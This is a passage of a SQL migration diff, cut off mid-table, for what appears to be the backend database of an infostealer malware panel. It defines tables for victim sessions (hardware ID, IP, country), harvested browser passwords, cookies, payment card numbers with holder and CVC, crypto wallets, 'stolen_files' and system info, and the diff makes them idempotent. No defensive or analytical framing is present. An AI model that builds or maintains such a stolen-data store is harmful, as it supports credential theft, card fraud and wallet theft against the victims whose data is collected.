@@ -1,4 +1,4 @@
-CREATE TABLE sessions (
+CREATE TABLE IF NOT EXISTS sessions (
     id           TEXT PRIMARY KEY,
     build_id     TEXT,
     hwid         TEXT,
@@ -6,13 +6,13 @@ CREATE TABLE sessions (
     username     TEXT,
     ip           TEXT,
     country_code TEXT,
-    created_at   DATETIME DEFAULT CURRENT_TIMESTAMP
+    created_at   TIMESTAMP WITHOUT TIME ZONE DEFAULT CURRENT_TIMESTAMP
 );
-CREATE INDEX idx_sessions_created ON sessions(created_at DESC);
-CREATE INDEX idx_sessions_country ON sessions(country_code);
-CREATE INDEX idx_sessions_hwid   ON sessions(hwid);
+CREATE INDEX IF NOT EXISTS idx_sessions_created ON sessions(created_at DESC);
+CREATE INDEX IF NOT EXISTS idx_sessions_country ON sessions(country_code);
+CREATE INDEX IF NOT EXISTS idx_sessions_hwid ON sessions(hwid);
 
-CREATE TABLE passwords (
+CREATE TABLE IF NOT EXISTS passwords (
     id             TEXT PRIMARY KEY,
     session_id     TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
     url            TEXT,
@@ -20,10 +20,10 @@ CREATE TABLE passwords (
     password_value TEXT,
     browser        TEXT
 );
-CREATE INDEX idx_passwords_session ON passwords(session_id);
-CREATE INDEX idx_passwords_url     ON passwords(url);
+CREATE INDEX IF NOT EXISTS idx_passwords_session ON passwords(session_id);
+CREATE INDEX IF NOT EXISTS idx_passwords_url ON passwords(url);
 
-CREATE TABLE cookies (
+CREATE TABLE IF NOT EXISTS cookies (
     id         TEXT PRIMARY KEY,
     session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
     domain     TEXT,
@@ -31,9 +31,9 @@ CREATE TABLE cookies (
     value      TEXT,
     path       TEXT
 );
-CREATE INDEX idx_cookies_session ON cookies(session_id);
+CREATE INDEX IF NOT EXISTS idx_cookies_session ON cookies(session_id);
 
-CREATE TABLE cards (
+CREATE TABLE IF NOT EXISTS cards (
     id         TEXT PRIMARY KEY,
     session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
     number     TEXT,
@@ -42,25 +42,25 @@ CREATE TABLE cards (
     holder     TEXT,
     cvc        TEXT
 );
-CREATE INDEX idx_cards_session ON cards(session_id);
+CREATE INDEX IF NOT EXISTS idx_cards_session ON cards(session_id);
 
-CREATE TABLE wallets (
+CREATE TABLE IF NOT EXISTS wallets (
     id         TEXT PRIMARY KEY,
     session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
     name       TEXT,
     path       TEXT
 );
-CREATE INDEX idx_wallets_session ON wallets(session_id);
+CREATE INDEX IF NOT EXISTS idx_wallets_session ON wallets(session_id);
 
-CREATE TABLE stolen_files (
+CREATE TABLE IF NOT EXISTS stolen_files (
     id         TEXT PRIMARY KEY,
     session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
     filename   TEXT,
     size       INTEGER
 );
-CREATE INDEX idx_files_session ON stolen_files(session_id);
+CREATE INDEX IF NOT EXISTS idx_files_session ON stolen_files(session_id);
 
-CREATE TABLE system_info (
+CREATE TABLE IF NOT EXISTS system_info (
     session_id TEXT PRIMARY KEY REFERENCES sessions(id) ON DELETE CASCADE,
     cpu        TEXT,
     gpu        TEXT,
